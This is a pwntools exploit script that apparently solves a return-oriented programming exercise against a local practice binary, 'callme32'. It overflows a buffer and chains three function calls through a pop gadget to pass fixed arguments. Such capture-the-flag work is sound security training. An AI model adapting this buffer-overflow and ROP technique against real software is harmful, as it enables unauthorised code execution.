#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')

def pwn():

    e = ELF("./callme32")

    ''' Create buffer '''
    buf = "A" * 44

    callme_one = p32(e.symbols["callme_one"])
    callme_two = p32(e.symbols["callme_two"])
    callme_three = p32(e.symbols["callme_three"])
    pop3_reg = p32(0x080488a9) # clear 3 values to make space for our values.

    # Our arguments
    val1 = p32(0x1)
    val2 = p32(0x2)
    val3 = p32(0x3)

    io = e.process()

    # Split up arguments to simplify the call in io.sendline
    # probably could make implementation cleaner by using loops
    # but want to make the implementation as simple as possible.
    f_one = callme_one + pop3_reg + val1 + val2 + val3
    f_two = callme_two + pop3_reg + val1 + val2 + val3
    f_three = callme_three + pop3_reg + val1 + val2 + val3

    io.sendline(buf + f_one + f_two + f_three)
    print(io.recvall())

if __name__ == '__main__':
    pwn()
